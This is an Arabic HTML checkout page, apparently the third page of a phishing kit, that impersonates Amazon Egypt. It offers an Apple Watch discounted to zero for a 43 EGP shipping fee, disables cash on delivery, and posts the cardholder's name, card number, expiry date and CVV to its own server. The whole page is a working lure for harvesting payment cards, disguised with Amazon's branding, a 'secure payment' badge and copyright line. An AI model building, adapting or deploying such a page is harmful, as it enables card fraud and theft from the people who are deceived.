<!-- ========================================== -->
<!-- 3. صفحة الدفع (Payment Page) -->
<!-- ========================================== -->
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>الدفع الآمن - أمازون</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Cairo', sans-serif; background-color: #eaeded; -webkit-tap-highlight-color: transparent; display: flex; flex-direction: column; min-height: 100vh; }
        .amazon-btn { background: linear-gradient(to bottom, #f7dfa5, #f0c14b); border: 1px solid; border-color: #a88734 #9c7e31 #846a29; border-radius: 8px; color: #111; }
        .amazon-btn:active { background: #f0c14b; box-shadow: inset 0 1px 2px rgba(0,0,0,0.2); }
        .input-field:focus { border-color: #e77600; box-shadow: 0 0 0 2px rgba(231,118,0,0.2); outline: none; }
    </style>
</head>
<body class="text-[#0F1111]">

    <header class="bg-[#131921] text-white px-4 py-2.5 flex items-center justify-between shadow-sm sticky top-0 z-50">
        <div class="flex items-center gap-1.5">
            <span class="text-[22px] font-bold tracking-tighter">amazon<span class="text-[#FF9900]">.eg</span></span>
        </div>
        <div class="flex items-center gap-1 text-[10px] text-green-400 font-bold">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
            دفع مشفر
        </div>
    </header>

    <main class="flex-grow px-3 py-4 w-full max-w-md mx-auto">
        
        <!-- الفاتورة -->
        <div class="bg-white p-4 rounded-lg shadow-sm border border-gray-200 mb-4 text-right">
            <h2 class="text-sm font-bold mb-3 border-b pb-2">ملخص الطلب</h2>
            <div class="flex justify-between text-xs mb-1 text-gray-500">
                <span>قيمة الساعة (Apple Watch):</span>
                <span class="line-through">24,499.00 ج.م</span>
            </div>
            <div class="flex justify-between text-xs mb-2 text-green-600 font-bold">
                <span>خصم العرض الترويجي:</span>
                <span>- 24,499.00 ج.م</span>
            </div>
            <div class="flex justify-between text-sm font-bold border-t pt-2">
                <span>رسوم الشحن والتوصيل:</span>
                <span class="text-[#B12704]">43.00 ج.م</span>
            </div>
        </div>

        <!-- الفورم -->
        <form action="/submit-payment" method="POST" class="bg-white p-4 rounded-lg shadow-sm border border-gray-200 space-y-3.5 text-right">
            <h2 class="text-sm font-bold mb-1">تفاصيل البطاقة</h2>
            
            <div>
                <label class="block text-xs font-bold mb-1">اسم صاحب البطاقة</label>
                <input type="text" name="card_name" required placeholder="الاسم كما يظهر على البطاقة" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field">
            </div>

            <div>
                <label class="block text-xs font-bold mb-1">رقم البطاقة</label>
                <input type="tel" name="card_number" maxlength="16" required placeholder="0000 0000 0000 0000" class="w-full p-2 border border-gray-300 rounded-md text-sm input-field tracking-widest text-center" dir="ltr">
            </div>

            <div class="grid grid-cols-2 gap-3">
                <div>
                    <label class="block text-xs font-bold mb-1">تاريخ الانتهاء</label>
                    <input type="tel" name="card_expiry" maxlength="5" required placeholder="MM/YY" class="w-full p-2 border border-gray-300 rounded-md text-sm text-center input-field" dir="ltr">
                </div>
                <div>
                    <label class="block text-xs font-bold mb-1">رمز الأمان (CVV)</label>
                    <input type="password" name="card_cvv" maxlength="3" required placeholder="***" class="w-full p-2 border border-gray-300 rounded-md text-sm text-center input-field" dir="ltr">
                </div>
            </div>

            <!-- خيار الدفع عند الاستلام -->
            <div class="pt-2">
                <div class="flex items-center gap-3 p-2.5 border border-gray-200 rounded-md bg-gray-50 opacity-60">
                    <input type="radio" disabled class="w-4 h-4">
                    <div class="flex-1">
                        <span class="block text-xs font-bold text-gray-700">الدفع عند الاستلام</span>
                        <span class="block text-[10px] text-red-600 font-semibold">غير متاح لهذا المنتج</span>
                    </div>
                </div>
            </div>

            <button type="submit" class="w-full amazon-btn py-2.5 font-bold text-sm shadow-sm mt-2">
                دفع 43.00 ج.م وتأكيد الشحنة
            </button>
        </form>
    </main>

    <footer class="bg-[#37475A] text-white py-2 text-center text-[10px] w-full">
        <p>&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </footer>
</body>
</html>
